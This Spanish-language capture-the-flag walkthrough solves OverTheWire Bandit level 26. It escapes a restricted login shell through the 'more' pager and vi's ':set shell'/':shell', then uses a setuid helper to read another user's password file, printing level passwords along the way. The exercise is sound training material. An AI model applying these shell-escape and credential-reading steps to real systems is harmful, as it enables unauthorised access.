# Level 26 to Level 27

## Objetivo

## Datos de acceso al nivel
Host: bandit.labs.overthewire.org  
Port: 2220
Username: bandit26
Password: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```bash
ssh bandit26@bandit.labs.overthewire.org -p 2220
```


## Solución
Antes de ejecutar el comando `ssh -i bandit26.sshkey bandit26@localhost -p 2220` desde bandit25, es necesario reducir el tamaño de la ventana considerablemente para que la terminal nos arroje el mensaje "--More--(xx%)" y poder invocar el editor vi, Desde ahí podemos cambiar el shell y ejecutarlo
```
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |  
--More--(83%)  
(Presionar 'v')  
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |  
"~/text.txt" [readonly] 6L, 258B  
:set shell=/bin/bash  
:shell  
[No write since last change]

bandit26@bandit:~$ ls -la
total 44
drwxr-xr-x  3 root     root      4096 Feb 21 22:03 .
drwxr-xr-x 70 root     root      4096 Feb 21 22:04 ..
-rwsr-x---  1 bandit27 bandit26 14876 Feb 21 22:03 bandit27-do
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
drwxr-xr-x  2 root     root      4096 Feb 21 22:03 .ssh
-rw-r-----  1 bandit26 bandit26   258 Feb 21 22:03 text.txt
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

## Notas adicionales


## Referencias

